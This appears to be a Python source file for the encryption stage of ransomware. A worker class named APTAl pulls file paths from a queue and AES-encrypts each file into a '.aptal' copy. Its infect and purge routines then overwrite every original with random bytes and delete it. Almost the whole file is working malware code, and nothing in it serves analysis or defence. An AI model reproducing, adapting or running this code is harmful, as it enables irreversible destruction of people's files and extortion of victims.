import sys
import os
import random
from queue import Queue
from threading import Thread

import Utils
sys.path.append(os.path.abspath('../hasp'))
from AESCipher import AESCipher

class APTAl(Thread):
    def __init__(self, idn, filelist, aeskey):
        Thread.__init__(self)
        self.id = idn
        self.file_list = filelist
        self.aes_key = aeskey
    
    def run(self):
        while True:
            iv, innocent_file_path = self.file_list.get()
            try:
                self.infect(iv, innocent_file_path)
            finally:
                self.file_list.task_done()

    def purge_original_file(self,path,repeat=1):
        file_size = os.path.getsize(path)
        chunk_size = 1*1024
        for _ in range(repeat):
            with open(path,"wb") as disarrange_file:
            # random.getrandbits(8) -> 2^8
                for _ in range((file_size//chunk_size)+1):
                    dummy_data = bytearray(random.getrandbits(8) for _ in range(chunk_size))
                    disarrange_file.write(dummy_data)
                #disarrange_file.seek(0,0)
        os.remove(path)
            

    def infect(self, iv, path):
        aes_cipher = AESCipher(self.aes_key)
        encrypted_file_path = path+".aptal"
        chunk_size = 16*1024
        with open(path, 'rb') as infile:
            with open(encrypted_file_path, 'wb') as outfile:
                while True:
                    chunk = infile.read(chunk_size)
                    if len(chunk) == 0:
                        break
                    outfile.write(aes_cipher.encrypt(iv, chunk))
        self.purge_original_file(path)
        